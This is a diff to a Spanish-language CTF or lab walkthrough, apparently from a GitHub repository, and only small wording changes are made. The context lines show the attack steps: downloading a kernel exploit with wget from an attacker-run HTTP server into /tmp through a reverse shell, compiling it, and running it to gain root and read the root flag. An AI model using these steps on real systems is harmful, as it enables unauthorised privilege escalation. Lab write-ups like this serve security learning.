@@ -155,7 +155,7 @@ python3 -m http.server 80
 ```
 ![22](https://user-images.githubusercontent.com/75953873/173488228-64eac9ac-e121-49f5-b84b-eea275f526ff.png)
 
-Descargar el exploit en la ruta `/tmp` desde la sesión obtenida (**reverse shell**); compilar y dar permisos de escritrura, lectura y ejecucción.
+Descargar el exploit en la ruta `/tmp` desde la sesión obtenida (**reverse shell**); compilar y dar permisos de escritrura, lectura y ejecucción:
 ```
 cd /tmp
 wget http://192.168.1.9/kernel.c
@@ -164,7 +164,7 @@ chmod 777 kernel
 ```
 ![23](https://user-images.githubusercontent.com/75953873/173488738-0392288d-4024-488b-9295-e4ea89066120.png)
 
-Por último, explotar el kernel `./kernel` y extraer la key (flag) del fichero `root.txt` dentro del directorio `/root`:
+Por último, explotar el kernel `./kernel` y capturar la key (flag) del fichero `root.txt` dentro del directorio `/root`:
 ```
 ./kernel
 cd /root
